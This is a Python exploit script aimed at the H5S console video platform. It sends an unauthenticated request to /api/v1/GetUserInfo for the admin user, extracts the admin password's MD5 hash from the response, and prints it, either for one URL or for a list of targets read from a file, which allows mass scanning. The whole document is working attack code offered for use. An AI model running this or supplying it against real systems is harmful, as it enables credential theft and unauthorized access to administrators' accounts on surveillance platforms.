#!/usr/bin/env python
# -*- conding:utf-8 -*-

import requests
import argparse
import sys
import urllib3
import re
urllib3.disable_warnings()


def title():
    print("""
                                  H5s console视频平台敏感信息泄漏
                                 use: python3 H5sinformation.py
                                     Author: Henry4E36
               """)

class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        target_url = self.url + "/api/v1/GetUserInfo?user=admin&session="
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
        }

        proxies = {
            "http": "http://127.0.0.1:8080",

        }
        try:
            res = requests.get(url=target_url, headers=headers, verify=False, timeout=5, proxies=proxies)
            if res.status_code == 200 and "strPasswd" in res.text:
                print(f"\033[31m[{chr(8730)}] 目标系统: {self.url} 存在信息泄漏\033[0m")
                passwd = res.json()["strPasswd"]
                print("用 户 名 : admin")
                print("密码(MD5):{0}".format(passwd))
                print("[" + "-"*100 + "]")
            else:
                print(f"[\033[31mx\033[0m]  目标系统: {self.url} 不存在信息泄漏！")
                print("[" + "-"*100 + "]")
        except Exception as e:
            print("[\033[31mX\033[0m]  连接错误！")
            print("[" + "-"*100 + "]")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)





if __name__ == "__main__":
    title()
    parser = ar=argparse.ArgumentParser(description='H5s console视频平台敏感信息泄漏')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 H5sinformation.py -u http://127.0.0.1\neg2:>>>python3 H5sinformation.py -f ip.txt")
    elif args.url:
        information(args).target_url()

    elif args.file:
        information(args).file_url()

